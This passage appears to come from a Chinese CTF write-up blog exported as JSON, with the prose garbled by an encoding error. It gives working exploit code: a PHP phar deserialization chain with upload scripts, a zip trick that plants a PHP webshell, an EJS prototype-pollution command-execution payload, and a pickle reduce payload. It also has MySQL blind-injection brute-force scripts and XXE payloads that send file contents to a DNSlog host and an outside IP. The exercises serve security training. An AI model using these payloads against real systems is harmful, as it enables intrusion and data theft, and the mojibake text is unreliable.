å†å›åˆ°airç±»ï¼Œæˆ‘ä»¬éœ€è¦p(value)ï¼Œpä¸ºDirectoryIteratorï¼Œvalueä¸ºglob://xxxxï¼Œåˆå› ä¸ºapple-getè§¦å‘air-setï¼Œæ‰€ä»¥apple-flagçš„å€¼ä¼šä¼ ç»™ valueï¼Œæ‰€ä»¥è®©`apple ->flag=â€˜glob://xxxâ€™` å¯¹äº$pï¼Œair-getä¸­$p=nanaä¸­ä¸å­˜åœ¨actå±æ€§ï¼Œ`_Ì²_get`è¢«è§¦å‘ï¼Œè¿”å›actï¼Œâ€¦pä¸ºactï¼Œæ‰€ä»¥è®©act=DirectoryIteratorã€‚\n>\n> å›åˆ°æœ€å¤–å±‚çš„treeï¼Œè¦è§¦å‘`__destruct`æ–¹æ³•éœ€è¦åˆ©ç”¨phpGCæœºåˆ¶\n>\n> â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n> åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/weixin_46081055/article/details/125046554\n\næœ€ç»ˆæ„é€ çš„expå¦‚ä¸‹\n\n```php\n<?php\nclass air{\n    public $p;\n}\n\nclass tree{\n    public $name;\n    public $act;\n}\n\nclass apple {\n    public $xxx;\n    public $flag;\n}\nclass banana {\n}\n\n$air = new air();\n$tree = new tree();\n$apple = new apple();\n$bana =new  banana();\n$apple ->flag='glob:///f*';\n$apple ->xxx= $air ;\n$air->p=$bana;\n$bana->act=\"DirectoryIterator\";\n$tree->name= $apple;\n\n$phar = new Phar(\"phar1.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stub\n$phar->setMetadata([0=>$tree,1=>NULL]); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\n$phar->addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\n//ç­¾åè‡ªåŠ¨è®¡ç®—\n$phar->stopBuffering(); ?>\n```\n\nåœ¨è¿™é‡Œæˆ‘ä»¬è¦ä¿®æ”¹ä¸€ä¸‹ç”Ÿæˆçš„pharæ–‡ä»¶ï¼Œè§¦å‘phpçš„åƒåœ¾å›æ”¶æœºåˆ¶æ¥è®©treeçš„`__destruct`æ–¹æ³•æ‰§è¡Œ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311902654.png)\n\nå°†æ­¤å¤„çš„1ä¿®æ”¹ä¸º0\n\nå› ä¸º**ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œ**çš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†`Array[0]`è®¾ç½®ä¸º`tree`å¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†`Array[0]`è®¾ç½®ä¸º`null`ï¼Œè¿™æ ·å‰é¢çš„`tree`å¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œå°±å¯ä»¥æ‰§è¡Œ`__destruct`äº†ã€‚\n\næ­¤æ—¶ç”±äºpharæ–‡ä»¶è¢«ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®å¤ä¸€ä¸‹æ–‡ä»¶ç­¾åï¼Œpythonè„šæœ¬å¦‚ä¸‹\n\n```python\nfrom hashlib import sha1\nf = open('./phar1.phar', 'rb').read() # ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶\ns = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ®\nh = f[-8:] # è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†\nnewf = s+sha1(s).digest()+h # æ•°æ® + ç­¾å + ç±»å‹ + GBMB\nopen('phar2.phar', 'wb').write(newf) # å†™å…¥æ–°æ–‡ä»¶\n```\n\nä¸‹ä¸€æ­¥å°±æ˜¯è¦å°†æ–‡ä»¶ä¸Šä¼ ä¸Šå»äº†ï¼Œè¿™é‡Œç”¨pythonè„šæœ¬æ¥å°†å†…å®¹ä¸Šä¼ \n\n```python\nimport requests\nimport gzip\nimport re\n\nurl = 'http://602ad6c4-4397-47e9-a1ea-d957fe9c0e7c.node4.buuoj.cn:81/'\n\nfile = open(\"./phar2.phar\", \"rb\") #æ‰“å¼€æ–‡ä»¶\nfile_out = gzip.open(\"./phar.zip\", \"wb+\")#åˆ›å»ºå‹ç¼©æ–‡ä»¶å¯¹è±¡ï¼Œå› ä¸ºä¸å‹ç¼©è¿‡ä¸äº†WAF\nprint(file_out)\nfile_out.writelines(file)\nfile_out.close()\nfile.close()\nres=requests.post(\n    url,\n    data={\n        1: 'O:1:\"D\":2:{s:5:\"start\";s:1:\"w\";}',\n        0: open('./phar.zip', 'rb').read()\n    },\n)\nprint(res.text)\n# file_get_contentsè§¦å‘pharååºåˆ—åŒ–\nres2 = requests.post(\n    url,\n    data={\n        1: 'O:1:\"D\":2:{s:5:\"start\";s:1:\"r\";}',\n        0: 'phar:///tmp/6e1fdc42161a607b4fcdec2222a38881.jpg'\n    }\n)\nprint(res2.text)\n```\n\næ‹¿åˆ°flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311910669.png)\n\n## ezip\n\né¦–å…ˆæ˜¯ä¸ªzipåˆ©ç”¨çš„[å¤§ä½¬æ€»ç»“](https://ucasers.cn/zipåœ¨CTF-webæ–¹å‘ä¸­çš„ä¸€äº›ç”¨æ³•/)ï¼Œè¿™é‡Œè¦åˆ©ç”¨çš„æ˜¯è¿™ä¸ª\n\n> è¿™é‡Œæ ¹æ®zipé‡Œé¢å‹ç¼©ç€çš„æ–‡ä»¶ä¸€ä¸ªä¸ªè§£å‹ï¼Œåªè¦æ‰§è¡Œè¿‡`php_zip_extract_file`å‡½æ•°ï¼Œç›¸åº”çš„æ–‡ä»¶å¤¹ä¹‹ä¸‹å°±ä¼šå‡ºç°é‚£ä¸ªå¯¹åº”çš„æ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœzipåŒ…é‡Œé¢ç¬¬ä¸€ä¸ªæ–‡ä»¶èƒ½è¢«è§£å‹ä½†æ˜¯ç¬¬äºŒä¸ªæ–‡ä»¶æœ‰é”™è¯¯çš„è¯ï¼Œæ•´ä¸ªå‘½ä»¤çš„çš„æ‰§è¡Œä¼šæŠ¥é”™ä½†ç¬¬ä¸€ä¸ªæ–‡ä»¶åœ¨æŠ¥é”™å‰å·²ç»è¢«å†™ä¸‹æ¥äº†ã€‚\n>\n> é‡Œé¢æœ‰ä¸€ä¸ªå…³äºphpè§£å‹æ¼æ´çš„ï¼Œå¦‚æœå‹ç¼©åŒ…å…¶ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶åå·¨é•¿ï¼Œå°±ä¼šæŠ¥é”™ï¼Œä½†æ˜¯é‡Œé¢çš„æœ¨é©¬å·²ç»è¢«è§£å‹äº†ã€‚æ‰€ä»¥ç›´æ¥æ‹¿é‚£ä¸ªè„šæœ¬è¿›è¡Œä¸€æ³¢è·‘ï¼š\n\n```python\nimport zipfile\nimport io\n \nmf = io.BytesIO()\nwith zipfile.ZipFile(mf, mode=\"w\", compression=zipfile.ZIP_STORED) as zf:\n    zf.writestr('1.php', b'@<?php eval($_POST[1])?>')\n    zf.writestr('A'*5000, b'AAAAA')\n \nwith open(\"shell.zip\", \"wb\") as f:\n    f.write(mf.getvalue())\n```\n\nå°è¯•è¯»å–flagå‘ç°æ²¡æœ‰æƒé™ï¼Œwhoamiä¹‹åå‘ç°ç”¨æˆ·ä¸ºwww-dataï¼Œ[suidææƒ](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)ï¼Œnlå‘½ä»¤èµ°\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311941868.png)\n\næåˆ°flag\n\n## NodeSoEasy\n\né¢˜ç›®ä¸­ç»™äº†æºç ï¼Œä¹Ÿç»™äº†æ‰€ä½¿ç”¨æ¡†æ¶çš„ç‰ˆæœ¬å·ï¼Œéå¸¸æ˜æ˜¾çš„åŸå‹é“¾æ±¡æŸ“ï¼Œä½†æ˜¯åœ¨ejs 3.1.7ä¸­å·²ç»å°†`outputFunctionName`çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´ä¿®å¤äº†~~æ‰€ä»¥æˆ‘ç”¨è¿™ä¸ªé“¾å­å¹²äº†åŠå¤©ä¹Ÿæ²¡ç»“æœ~~ï¼Œçœ‹wpåˆ©ç”¨çš„æ˜¯å¦ä¸€ä¸ªé“¾å­`escapeFunction`\n\n```javascript\n{\"__proto__\":{\"__proto__\":{\"client\":true,\"escapeFunction\":\"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');\",\"compileDebug\":true}}}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205312011891.png)\n\n## middle\n\npickleååºåˆ—åŒ–æï¼Œè‡ªå·±æ„é€ è„šæœ¬å’¯\n\n```php\nimport base64\nimport pickle\nimport config\ndef backdoor():\n    return 1;\nclass People(object):\n    def __reduce__(self):\n        return (config.backdoor, ([\"os.popen('cat /flag*').read()\"],))\na = People()\nc = pickle.dumps(a)\nprint(base64.b64encode(c))\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"ISCC2022","url":"/posts/8cbc7f95.html","content":"\n### Easy-SQL\n\nselectè¢«banäº†ï¼Œåªèƒ½å…ˆå°è¯•æå‡ºæ•°æ®åº“äº†\n\n```\ndatabaseï¼šsecurity\nuserï¼štest\nversionï¼š8.0.28\n```\n\næ²¡æœ‰selectåªèƒ½çœ‹MySQL8çš„æ–°ç‰¹æ€§äº†\n\nä½¿ç”¨mysql8.xçš„æ–°å¢å‘½ä»¤valuesç›´æ¥unionè¾“å‡º\n\n**ç³»ç»Ÿè¡¨æ›´æ¢ä¸ºInnoDBè¡¨**\n\nç³»ç»Ÿè¡¨å…¨éƒ¨æ¢æˆäº‹åŠ¡å‹çš„innodbè¡¨ï¼Œé»˜è®¤çš„MySQLå®ä¾‹å°†ä¸åŒ…å«ä»»ä½•MyISAMè¡¨ï¼Œé™¤éæ‰‹åŠ¨åˆ›å»ºMyISAMè¡¨\n\n**TABLE STATEMENT**\n\ntableè¯­å¥æ˜¯mysql8.0.19å¼•å…¥çš„è¯­å¥ï¼Œä½œç”¨æ˜¯è¿”å›è¡¨çš„å…¨éƒ¨å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¿”å›è¡¨çš„è¡Œå’Œåˆ—\n\n```sql\ntable mysql.user union mysql.user\n```\n\n**VALUES STATEMENT**\n\nvaluesè¯­å¥é€šè¿‡ç»™å‡ºå€¼çš„æ–¹å¼ç›´æ¥ç»„æˆä¸€ä¸ªè¡¨ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æŠŠä¸€ä¸ªæˆ–è€…å¤šä¸ªæ•°æ®ä½œä¸ºè¡¨æ¥å±•ç¤ºå‡ºæ¥ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªè¡¨æ•°æ®,å½“ç”¨unionæŸ¥è¯¢æ—¶ï¼Œåˆ—æ•°å¦‚æœä¸å¯¹ä¼šå‘ç”ŸæŠ¥é”™\n\n```sql\nvalues row(1,2,3),row(2,3,4);\nvalues row(1,2,3) union values row(2,3,4);\n```\n\nåˆ©ç”¨`?id=0||('~','','','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit 1)`\n\næ‰¾åˆ°information_schema.columnsä¸­å…±æœ‰22åˆ—æ•°æ®ï¼Œè„šæœ¬çˆ†ç ´å‡ºè¡¨å\n\n```python\nimport requests\n\nurl = \"http://59.110.159.206:7010/?id=\"\nfor k in range(732, 740):\n    table = \"\"\n    column = \"\"\n    for j in range(732, 739):\n        for l in range(1, 100):\n            for i in range(1, 127):\n                ttable = table + chr(i)\n                com = f\"0||('def','security','{ttable}','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                tex = requests.get(url + com).text\n                if \"Dumb\" in tex:\n                    table = table + chr(i - 1)\n                    print(table)\n                    break\n            com = f\"0||('def','security','{table + chr(33)}','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n            tex = requests.get(url + com).text\n            if \"Dumb\" in tex:\n                print(table)\n                for l in range(1, 100):\n                    for i in range(1, 127):\n                        tcolumn = column + chr(i)\n                        com = f\"0||('def','security','{table}','{tcolumn}','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                        tex = requests.get(url + com).text\n                        if \"Dumb\" in tex:\n                            column = column + chr(i - 1)\n                            break\n                    com = f\"0||('def','security','{table}','{column + chr(33)}','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                    tex = requests.get(url + com).text\n                    if \"Dumb\" in tex:\n                        print(table + '.' + column)\n                        break\n        break\n\n```\n\nåˆ—ååŒæ ·\n\n```\nsecurity\n\tusers\n\t\tID\n\t\tUSERNAME\n\t\tPASSWD\n\temails\n\t\tG\n\t\tQ\n\t\t=\n\tflag\n\t\tG\n\t\tFe\n```\n\nä½¿ç”¨union tableæ¥æå‡ºé‚®ç®±\n\n```\n?id=0 union (table security.emails limit 7,1)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-04 16.00.43.png)\n\nçœ‹æºç \n\n```php\n<?php\ninclude \"./config.php\";\n// error_reporting(0);\n// highlight_file(__FILE__);\n$conn = mysqli_connect($hostname, $username, $password, $database);\n   if ($conn->connect_errno) {\n    die(\"Connection failed: \" . $conn->connect_errno);\n} \n\necho \"Where is the database?\".\"<br>\";\n\necho \"try ?id\";\n\nfunction sqlWaf($s)\n{\n    $filter = '/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|<|;|\"|\\^|\\||\\ |\\'/i';\n    if (preg_match($filter,$s))\n        return False;\n    return True;\n}\n\nif (isset($_GET['id'])) \n{\n    $id = $_GET['id'];\n    $sql = \"select * from users where id=$id\";\n    $safe = preg_match('/select/is', $id);\n    if($safe!==0)\n        die(\"No select!\");\n    $result = mysqli_query($conn, $sql);\n    if ($result) \n    {\n        $row = mysqli_fetch_array($result);\n        echo \"<h3>\" . $row['username'] . \"</h3><br>\";\n        echo \"<h3>\" . $row['passwd'] . \"</h3>\";\n    }\n    else\n        die('<br>Error!');\n}\n\n\nif (isset($_POST['username']) && isset($_POST['passwd'])) \n{\n\n    $username = strval($_POST['username']);\n    $passwd = strval($_POST['passwd']);\n\n    if ( !sqlWaf($passwd) )\n        die('damn hacker');\n\n    $sql = \"SELECT * FROM users WHERE username='${username}' AND passwd= '${passwd}'\";\n    $result = $conn->query($sql);\n    if ($result->num_rows > 0) {\n        $row = $result->fetch_assoc();\n        if ( $row['username'] === 'admin' && $row['passwd'] )\n        {\n            if ($row['passwd'] == $passwd)\n            {\n                die($flag);\n            } else {\n                die(\"username or passwd wrong, are you admin?\");\n            }\n        } else {\n            die(\"wrong user\");\n        }\n    } else {\n        die(\"user not exist or wrong passwd\");\n    }\n}\nmysqli_close($conn); \n?>\n\n```\n\nè¦æ±‚ç»“æœä¸­æŸ¥è¯¢å‡ºçš„ç”¨æˆ·åä¸ºadminå¹¶ä¸”æäº¤çš„å¯†ç å’ŒæŸ¥è¯¢çš„å¯†ç ç›¸åŒæ‰èƒ½æ‹¿åˆ°flagï¼Œåœ¨passwdå¤„åšäº†è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨usernameå¤„è¿›è¡Œæ³¨å…¥å°±è¡Œäº†ï¼Œåœ¨ä¸Šé¢å·²ç»å¾—åˆ°äº†usersè¡¨å…±æœ‰ä¸‰åˆ—ï¼Œç›´æ¥union selectæ„é€ æˆ‘ä»¬è‡ªå·±çš„usernameå’Œpasswd\n\n```\npayload:\nPOST\nusername='union select '1','admin','1'%23&passwd=1\n```\n\n### å†¬å¥¥ä¼š\n\narray_searchå¼±æ¯”è¾ƒï¼Œä¼ å…¥æ•°å­—å³å¯\n\n```\npayload:?Information={\"year\":\"2022a\",\"items\":[0,[1,2],1]}\n```\n\n### findme\n\n```php\n<?php \nhighlight_file(__FILE__); \n\nclass a{ \n    public $un0; \n    public $un1; \n    public $un2; \n    public $un3; \n    public $un4; \n     \n    public function __destruct(){ \n        if(!empty($this->un0) && empty($this->un2)){ \n            $this -> Givemeanew(); \n            if($this -> un3 === 'unserialize'){ \n                $this -> yigei(); \n            } \n            else{ \n                $this -> giao(); \n            } \n        } \n    } \n\n    public function Givemeanew(){ \n        $this -> un4 = new $this->un0($this -> un1); \n    } \n\n    public function yigei(){ \n        echo 'Your output: '.$this->un4; \n    } \n     \n    public function giao(){ \n        @eval($this->un2); \n    } \n     \n    public function __wakeup(){ \n        include $this -> un2.'hint.php'; \n    } \n} \n\n$data = $_POST['data']; \nunserialize($data);\n```\n\nåŸç”Ÿç±»ååºåˆ—åŒ–ï¼Œå…ˆç”¨ä¼ªåè®®è¯»å‡ºæç¤º\n\n","tags":["CTF","web"]},{"title":"CTFshowXXE","url":"/posts/949d2db6.html","content":"\n## XMLåŸºç¡€çŸ¥è¯†\n\nè¦äº†è§£xxeæ¼æ´ï¼Œé‚£ä¹ˆä¸€å®šå¾—å…ˆæ˜ç™½åŸºç¡€çŸ¥è¯†ï¼Œäº†è§£xmlæ–‡æ¡£çš„åŸºç¡€ç»„æˆã€‚\n\n> XMLç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ \n\n### xmlçš„åŸºæœ¬æ ¼å¼\n\n```\n- æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾\n- XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ\n- XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—\n- XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ \n- XML çš„å±æ€§å€¼é¡»åŠ å¼•å·\n```\n\nè¿™é‡Œæ”¾ä¸€ä¸ªæ­£è§„çš„ä¾‹å­\n\n```xml\n<bookstore> <!--æ ¹å…ƒç´ -->\n<book category=\"COOKING\"> <!--bookstoreçš„å­å…ƒç´ ï¼Œcategoryä¸ºå±æ€§-->\n<title>Everyday Italian</title>      <!--bookçš„å­å…ƒç´ ï¼Œlangä¸ºå±æ€§-->\n<author>Giada De Laurentiis</author>       <!--bookçš„å­å…ƒç´ -->\n<year>2005</year> <!--bookçš„å­å…ƒç´ -->\n<price>30.00</price> <!--bookçš„å­å…ƒç´ -->\n</book> <!--bookçš„ç»“æŸ-->\n</bookstore> <!--bookstoreçš„ç»“æŸ-->\n```\n\n### DTD\n\næ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚DTDå¯è¢«æˆè¡Œåœ°å£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚å¸¦æœ‰DTDçš„XMLæ–‡æ¡£å®ä¾‹\n\n```xml-dtd\n<?xml version=\"1.0\"?>//è¿™ä¸€è¡Œæ˜¯ XML æ–‡æ¡£å®šä¹‰\n<!DOCTYPE message [\n<!ELEMENT message (receiver ,sender ,header ,msg)>\n<!ELEMENT receiver (#PCDATA)>\n<!ELEMENT sender (#PCDATA)>\n<!ELEMENT header (#PCDATA)>\n<!ELEMENT msg (#PCDATA)>\n```\n\nä¸Šé¢è¿™ä¸ª DTD å°±å®šä¹‰äº† XML çš„æ ¹å…ƒç´ æ˜¯ messageï¼Œç„¶åè·Ÿå…ƒç´ ä¸‹é¢æœ‰ä¸€äº›å­å…ƒç´ ï¼Œé‚£ä¹ˆ XML åˆ°æ—¶å€™å¿…é¡»åƒä¸‹é¢è¿™æ ·\n\n```xml\n<message>\n<receiver>Myself</receiver>\n<sender>Someone</sender>\n<header>TheReminder</header>\n<msg>This is an amazing book</msg>\n</message>\n```\n\n### å†…éƒ¨å®ä½“\n\nå¸¦æœ‰DTDçš„XMLæ–‡æ¡£å®ä¾‹\n\n```xml-dtd\n<?xml version=\"1.0\"?>//è¿™ä¸€è¡Œæ˜¯ XML æ–‡æ¡£å®šä¹‰\n<!DOCTYPE message [\n<!ELEMENT message (receiver ,sender ,header ,msg)>\n<!ELEMENT receiver (#PCDATA)>\n<!ELEMENT sender (#PCDATA)>\n<!ELEMENT header (#PCDATA)>\n<!ELEMENT msg (#PCDATA)>\n<message>\n<receiver>Myself</receiver>\n<sender>Someone</sender>\n<header>TheReminder</header>\n<msg>This is an amazing book</msg>\n</message>\n```\n\nå…¶å®é™¤äº†åœ¨ DTD ä¸­å®šä¹‰å…ƒç´ ï¼ˆå…¶å®å°±æ˜¯å¯¹åº” XML ä¸­çš„æ ‡ç­¾ï¼‰ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨ DTD ä¸­å®šä¹‰å®ä½“(å¯¹åº”XML æ ‡ç­¾ä¸­çš„å†…å®¹)ï¼Œæ¯•ç«Ÿ ML ä¸­é™¤äº†èƒ½æ ‡ç­¾ä»¥å¤–ï¼Œè¿˜éœ€è¦æœ‰äº›å†…å®¹æ˜¯å›ºå®šçš„\n\n```xml-dtd\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe \"test\" >]>\n```\n\nè¿™é‡Œ å®šä¹‰å…ƒç´ ä¸º`ANY`è¯´æ˜æ¥å—ä»»ä½•å…ƒç´ ï¼Œä½†æ˜¯å®šä¹‰äº†ä¸€ä¸ª xml çš„å®ä½“ï¼ˆå®ä½“å…¶å®å¯ä»¥çœ‹æˆä¸€ä¸ªå˜é‡ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬å¯ä»¥åœ¨ XML ä¸­é€šè¿‡ & ç¬¦å·è¿›è¡Œå¼•ç”¨ï¼‰ï¼Œé‚£ä¹ˆ XML å°±å¯ä»¥å†™æˆè¿™æ ·\n\n```xml-dtd\n<creds>\n<user>&xxe;</user>\n<pass>mypass</pass>\n</creds>\n```\n\næˆ‘ä»¬ä½¿ç”¨&xxeå¯¹ä¸Šé¢å®šä¹‰çš„xxeå®ä½“è¿›è¡Œäº†å¼•ç”¨ï¼Œåˆ°æ—¶å€™è¾“å‡ºçš„æ—¶å€™&xxeå°±ä¼šè¢« â€œtestâ€ æ›¿æ¢ã€‚\n\n### å¤–éƒ¨å®ä½“\n\nå®ä½“åˆ†ä¸ºä¸¤ç§ï¼Œå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“ï¼Œä¸Šé¢æˆ‘ä»¬ä¸¾çš„ä¾‹å­å°±æ˜¯å†…éƒ¨å®ä½“ï¼Œä½†æ˜¯å®ä½“å®é™…ä¸Šå¯ä»¥ä»å¤–éƒ¨çš„ dtd æ–‡ä»¶ä¸­å¼•ç”¨ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢çš„ä»£ç ï¼š\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE root-element SYSTEM \"file:///c:/test.dtd\">\n<note>\n<to>Y0u</to>\n<from>@re</from>\n<head>v3ry</head>\n<body>g00d!</body>\n</note>\n```\n\n```xml-dtd\n<!ELEMENT to (#PCDATA)><!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹-->\n<!ELEMENT from (#PCDATA)><!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹-->\n<!ELEMENT head (#PCDATA)><!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹-->\n<!ELEMENT body (#PCDATA)><!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹-->\n```\n\n![](https://img-blog.csdnimg.cn/20210305225448278.png)\n\nå½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§å¼•ç”¨æ–¹å¼æ˜¯ä½¿ç”¨ å¼•ç”¨å…¬ç”¨ DTD çš„æ–¹æ³•ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š\n\n```xml-dtd\n<!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€>\n```\n\nè¿™ä¸ªåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¹Ÿå¯ä»¥èµ·åˆ°å’Œ SYSTEM ä¸€æ ·çš„ä½œç”¨\n\næˆ‘ä»¬ä¸Šé¢å·²ç»å°†å®ä½“åˆ†æˆäº†ä¸¤ä¸ªæ´¾åˆ«ï¼ˆå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å¤–éƒ¨ï¼‰ï¼Œä½†æ˜¯å®é™…ä¸Šä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®ä½“ä¹Ÿå¯ä»¥åˆ†æˆä¸¤ä¸ªæ´¾åˆ«ï¼ˆé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ï¼‰\n\n### é€šç”¨å®ä½“\n\nç”¨`&å®ä½“å;` å¼•ç”¨çš„å®ä½“ï¼Œä»–åœ¨DTD ä¸­å®šä¹‰ï¼Œåœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨\n\n```xml-dtd\n<?xml version=\"1.0\" encoding=\"utf-8\"?> \n<!DOCTYPE updateProfile [<!ENTITY file SYSTEM \"file:///c:/windows/win.ini\"> ]> \n<updateProfile>  \n    <firstname>Joe</firstname>  \n    <lastname>&file;</lastname>  \n    ... \n</updateProfile>\n```\n\n### å‚æ•°å®ä½“\n\n(1)ä½¿ç”¨ % å®ä½“å(è¿™é‡Œé¢ç©ºæ ¼ä¸èƒ½å°‘) åœ¨ DTD ä¸­å®šä¹‰ï¼Œå¹¶ä¸”åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ %å®ä½“å; å¼•ç”¨\n(2)åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“\n(3)å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨\n\n```xml-dtd\n<!ENTITY % an-element \"<!ELEMENT mytag (subtag)>\"> \n<!ENTITY % remote-dtd SYSTEM \"http://somewhere.example.org/remote.dtd\"> \n%an-element; %remote-dtd;\n```\n\nåœ¨äº†è§£äº†åŸºç¡€çŸ¥è¯†åï¼Œä¸‹é¢å¼€å§‹äº†è§£xmlå¤–éƒ¨å®ä½“æ³¨å…¥å¼•å‘çš„é—®é¢˜\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**373**\n\næœ€ç®€å•çš„ç‰ˆæœ¬å’¯ï¼Œå¸¦å›æ˜¾ç›´æ¥æ„é€ \n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE xml [\n<!ENTITY xxe SYSTEM \"file:///flag\">\n]>\n<j1an>\n<ctfshow>&xxe;</ctfshow>\n</j1an>\n```\n\n**374**\n\næ²¡æœ‰å›æ˜¾éœ€è¦å¤–å¸¦äº†\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE xml [\n<!ENTITY file SYSTEM \"file:///flag\">\n<!ENTITY xxe SYSTEM \"http://&file;.i1ecvd.dnslog.cn\">\n]>\n<j1an>\n<ctfshow>&xxe;</ctfshow>\n</j1an>\n```\n\nè¿™ç§æ–¹æ³•ä¸çŸ¥é“ä¸ºå•¥å¸¦ä¸å‡ºæ¥\n\n```xml-dtd\n<!DOCTYPE ANY[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % remote SYSTEM \"http://20.231.29.154/1.xml\">\n%remote;\n%send;\n]>\n```\n\n```xml-dtd\n#1.xml\n<!ENTITY % all\n\"<!ENTITY &#x25; send SYSTEM 'http://20.231.29.154/1.php?1=%file;'>\"\n>\n&all;\n```\n\n","tags":["CTF","web"]},{"title":"CTFshowSSRF","url":"/posts/b1fc6cca.html","content":"\n## SSRFåŸºç¡€\n\nSSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ 